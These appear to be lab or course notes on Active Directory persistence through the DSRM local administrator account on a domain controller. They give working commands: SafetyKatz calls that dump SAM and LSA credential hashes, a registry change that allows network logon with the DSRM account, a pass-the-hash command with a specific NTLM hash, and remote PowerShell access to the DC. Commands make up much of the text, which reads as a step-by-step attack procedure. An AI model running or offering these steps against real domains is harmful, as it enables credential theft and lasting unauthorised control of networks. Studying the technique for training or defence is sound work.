- this is local administrator on the DC
- DSRM is Directory Services Restore Mode.
- There is a local administrator on every DC called "Administrator" whose password is the DSRM password.
- DSRM password (SafeModePassword) is required when a server is promoted to Domain Controller and it is rarely changed.
- After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.
- Dump DSRM password (needs DA privs)
```
SafetyKatz.exe "token::elevate" "lsadump::sam"
```
- Compare the Administrator hash with the Administrator hash of below command
```
SafetyKatz.exe "lsadump::lsa /patch"
```
- First one is the DSRM local Administrator.
- Since it is the local administrator of the DC, we can pass the hash to authenticate.
 - But, the Logon Behavior for the DSRM account needs to be changed before we can use its hash
```
winrs -r:dcorp-dc cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
```

- Use below commands to Pass-the-hash of DSRM administrator and access the DC:
```
SafetyKatz.exe "sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe"

Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1

Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
```
